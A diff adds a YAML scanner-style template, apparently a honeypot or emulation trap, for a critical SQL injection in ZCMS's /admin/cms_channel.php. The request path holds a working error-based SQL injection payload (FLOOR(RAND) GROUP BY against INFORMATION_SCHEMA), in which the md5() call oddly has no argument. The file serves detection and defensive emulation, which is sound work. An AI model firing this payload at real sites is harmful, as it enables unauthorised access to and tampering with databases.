@@ -1,0 +1,27 @@
+id: zcms-v3-sqli
+info:
+  name: ZCMS - SQL Injection
+  author: princechaddha
+  description: ZCMS contains a SQL injection vulnerability. An attacker can possibly
+    obtain sensitive information from a database, modify data, and execute unauthorized
+    administrative operations in the context of the affected site.
+  severity: critical
+  reference:
+  - https://www.anquanke.com/post/id/183241
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-89
+  metadata:
+    max-request: 1
+  tags: zcms,sqli
+traps:
+- request:
+    method: GET
+    path: /admin/cms_channel.php?del=123456+AND+(SELECT+1+FROM(SELECT+COUNT(*)%2cCONCAT(0x7e%2cmd5()%2c0x7e%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.CHARACTER_SETS+GROUP+BY+x)a)--%2b'
+    headers: null
+    body: null
+  response:
+    status_code: 200
+    headers: {}
+    body: '{{md5({{num}})}}'
